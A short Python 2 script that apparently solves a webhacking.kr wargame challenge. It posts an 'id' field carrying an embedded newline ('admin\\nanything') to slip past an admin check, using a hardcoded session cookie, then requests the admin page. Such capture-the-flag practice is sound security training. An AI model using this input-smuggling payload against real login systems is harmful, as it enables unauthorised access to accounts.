import httplib
import requests

url="http://webhacking.kr/challenge/bonus/bonus-9/index.php"
param=""
cookies=dict(PHPSESSID="5v6qvnmsu7o7mtpbjrmc38c5j5")
payload = {'id': "admin\\nanything"}
r=requests.post(url,data=payload,cookies=cookies)

print r.text
tt="http://webhacking.kr/challenge/bonus/bonus-9/admin.php"
r=requests.get(tt,cookies=cookies)
print r.text